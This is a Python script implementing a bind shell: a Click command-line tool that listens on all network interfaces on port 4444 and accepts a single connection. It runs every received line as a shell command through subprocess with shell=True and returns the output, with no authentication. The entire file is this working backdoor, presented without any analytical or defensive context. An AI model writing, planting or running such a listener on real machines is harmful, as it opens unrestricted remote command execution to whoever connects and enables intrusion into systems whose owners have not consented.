import socket
import subprocess
import click

#run shell commands and return their output
def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

#Define a CLI using Click 
@click.command()
@click.option('--port', '-p', default=4444)

def main(port):
    #Create a socket to listen for incoming connections. Drop after 4 attempts 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)
    client_socket, address = s.accept()

    while True:
        #Initialize an empty list to store data chunks of 2048 bytes
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        #Continue until a newline is found
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        #Combine chunks 
        cmd = (b''.join(chunks)).decode()[:-1]

        #Close the connection on the 'exit' command
        if cmd.lower() == 'exit':
            client_socket.close()
            break

        #Execute the received command and send output to client
        output = run_cmd(cmd)
        client_socket.sendall(output)

if __name__ == '__main__':
    main()
